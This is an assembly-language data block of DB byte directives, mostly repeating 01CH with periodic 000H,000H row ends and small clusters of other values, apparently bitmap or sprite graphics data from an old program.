DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,005H,007H,00AH,00AH,00AH,00AH,00AH,00AH,00AH,006H
DB 005H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,009H,004H,005H
DB 008H,005H,004H,009H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00FH,011H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,017H,015H,01AH,01AH,019H,00AH,001H,003H,01BH,003H,008H,008H
DB 005H,005H,005H,005H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H
DB 014H,01AH,01AH,019H,00DH,004H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,009H,001H,005H,008H,005H,004H,009H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,00FH,011H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 017H,015H,01AH,01AH,019H,00AH,00BH,01CH,003H,01CH,004H,008H,005H,005H,005H
DB 005H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH
DB 019H,00DH,005H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,00DH,011H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,015H,01AH
DB 01AH,019H,00AH,001H,01CH,01CH,01CH,002H,008H,005H,005H,005H,005H,00FH,00AH
DB 019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,005H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00FH
DB 011H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,015H,01AH,01AH,019H,00AH
DB 00BH,01CH,01CH,01CH,003H,008H,005H,005H,005H,005H,00FH,00AH,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,017H,014H,01AH,01AH,019H,00DH,005H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00DH,011H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,017H,015H,01AH,01AH,019H,00AH,001H,01CH,01CH
DB 01CH,01CH,002H,005H,005H,005H,005H,00FH,00AH,019H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,015H,014H,01AH,01AH,019H,00DH,005H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00FH,011H,018H,019H,019H,019H,019H
DB 019H,019H,019H,011H,011H,019H,018H,015H,00AH,00BH,01CH,01CH,01CH,01CH,01CH
DB 005H,005H,005H,005H,00FH,00AH,011H,015H,016H,016H,016H,016H,016H,016H,013H
DB 00FH,016H,016H,014H,00DH,005H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,006H,011H,00AH,00AH,00AH,00AH,00AH,00AH,00AH,00AH
DB 00AH,00AH,00DH,00DH,00AH,00AH,001H,01CH,01CH,01CH,01CH,003H,004H,005H,005H
DB 005H,00FH,013H,00DH,00DH,00DH,00DH,00DH,010H,00DH,00EH,00DH,010H,00CH,00EH
DB 00CH,010H,004H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,005H,005H,005H,008H,002H
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,009H,005H,005H,005H,000H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,005H,005H,005H,01BH,003H,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,001H,005H,005H,002H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 005H,005H,002H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,001H,004H,004H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,004H,004H,003H,01BH,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
